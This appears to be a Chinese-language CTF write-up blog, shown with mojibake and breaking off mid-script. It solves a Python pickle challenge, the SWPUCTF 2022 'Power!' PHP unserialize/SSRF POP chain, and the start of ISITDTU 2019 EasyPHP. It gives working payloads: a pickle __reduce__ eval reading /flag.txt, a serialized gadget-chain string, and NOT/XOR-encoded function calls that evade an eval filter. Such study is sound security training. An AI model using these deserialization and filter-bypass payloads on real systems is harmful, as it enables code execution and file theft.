<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cmd</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = cmd()</span><br><span class="line">c = pickle.dumps(c)</span><br><span class="line">d=urllib.quote(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå½“æ—¶è¯•äº†å¥½ä¹…ï¼Œåæ¥æ‰çŸ¥é“urllib.unquoteå¯¹åº”python2ç‰ˆæœ¬ï¼Œè¦ç”¨python2æ¥ï¼Œä¸èƒ½ç”¨python3ï¼ŒåŒæ—¶cmdç±»ä¸­è¦ç»§æ‰¿objectæ‰è¡Œï¼ï¼ï¼</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217194810760.png" alt="image-20241217194810760" style="zoom: 67%;" />





<h2 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-Power"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-Power" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]Power!"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]Power!</h2><p>ä¸»è¦æ˜¯å…³äºphpååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Image Viewer ~ @V@&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;This is a Image viewer&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;/&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;vergil.jpg&quot;</span> name=<span class="string">&quot;image_path&quot;</span>&gt;</span><br><span class="line">        &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;submit&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;local = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span> = <span class="string">&quot;hacker.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- ?source= --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$black_list</span> = <span class="string">&quot;111&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$local</span> = <span class="string">&quot;http://127.0.0.1:65500/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;local = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$superhacker</span> = <span class="string">&quot;http://127.0.0.1:65500/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b=<span class="string">&quot;local&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="variable">$b</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//a:2:&#123;s:1:&quot;a&quot;;O:8:&quot;Backdoor&quot;:3:&#123;s:1:&quot;a&quot;;O:10:&quot;FileViewer&quot;:3:&#123;s:10:&quot;black_list&quot;;s:3:&quot;111&quot;;s:5:&quot;local&quot;;s:23:&quot;http://127.0.0.1:65500/&quot;;s:4:&quot;path&quot;;s:8:&quot;flag.php&quot;;&#125;s:1:&quot;b&quot;;s:5:&quot;local&quot;;s:11:&quot;superhacker&quot;;s:23:&quot;http://127.0.0.1:65500/&quot;;&#125;s:1:&quot;a&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç”¨åˆ°gcå›æ”¶æœºåˆ¶ç­‰</p>
<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosÃ© will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡ä¸¤ä¸ªifå³å¯å®ç°å‘½ä»¤æ‰§è¡Œ</p>
<p>é¦–å…ˆçœ‹çœ‹è¿‡æ»¤çš„ä¸œè¥¿ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00-\x20ï¼Œ0-1ï¼Œ&#x27;&quot;`$&amp;.,|[]&#123;_defgops&#125;+å’Œ\x7F</span><br></pre></td></tr></table></figure>

<p>å†çœ‹ä¸‹é¢çš„ifï¼Œcount_charsç¬¬äºŒä¸ªå‚æ•°ä¸º3ï¼Œ</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218143940345.png" alt="image-20241218143940345" style="zoom:67%;" />

<p>ä¹Ÿå°±æ˜¯ä¸èƒ½ä½¿ç”¨è¶…è¿‡13ç§å­—ç¬¦ï¼ã€</p>
<p>æ¥ä¸‹æ¥ï¼Œæœ‰ä¸€ç§åŠæ³•å¯ä»¥çœ‹æˆ‘ä»¬åˆ°åº•å¯ä»¥ç”¨å“ªäº›å†…ç½®å‡½æ•°ï¼ï¼ï¼å¥½åŠæ³•ï¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span>=<span class="title function_ invoke__">get_defined_functions</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$array</span>[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$arr</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$arr</span>) )<span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )<span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$arr</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218144520020.png" alt="image-20241218144520020"></p>
<p>è·å–å¯ç”¨å‡½æ•°</p>
<p>ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰å‘ç°å¯ä¾›æˆ‘ä»¬ä½¿ç”¨çš„å‡½æ•°ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æ¥ç€çœ‹è¿‡æ»¤ï¼Œå‘ç°å¼‚æˆ–ï¼Œå–åä¹‹ç±»çš„æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥è€ƒè™‘ç”¨ä»–ä»¬æ¥ç»•è¿‡ã€‚</p>
<p>å°è¯•å–å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~(&#x27;phpinfo&#x27;));</span><br><span class="line">//%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150653705.png" alt="image-20241218150653705"></p>
<p>æˆåŠŸæ‰§è¡Œphpinfo</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥çœ‹çœ‹disable function</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150726126.png" alt="image-20241218150726126"></p>
<p>print_r()ï¼Œscandir()ä¹‹ç±»çš„å¯ä»¥ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~(&#x27;print_r&#x27;));</span><br><span class="line">//%8F%8D%96%91%8B%A0%8D</span><br><span class="line">echo urlencode(~(&#x27;scandir&#x27;));</span><br><span class="line">//%8C%9C%9E%91%9B%96%8D</span><br><span class="line">echo urlencode(~(&#x27;.&#x27;));</span><br><span class="line">//%D1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)(~%D1));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ€»å…±15ä¸ªå­—ç¬¦ï¼Œè¶…è¿‡äº†ä¸¤ä¸ª</p>
<p>ä½†æ˜¯è¿™é‡Œå­—ç¬¦ç§ç±»è¶…è¿‡é™åˆ¶ï¼Œè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">en</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">ord</span>(s) ^ <span class="number">0xff</span>)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="string">&#x27;printrscandir&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> p:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> p:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(j) ^ <span class="built_in">ord</span>(k) ^ <span 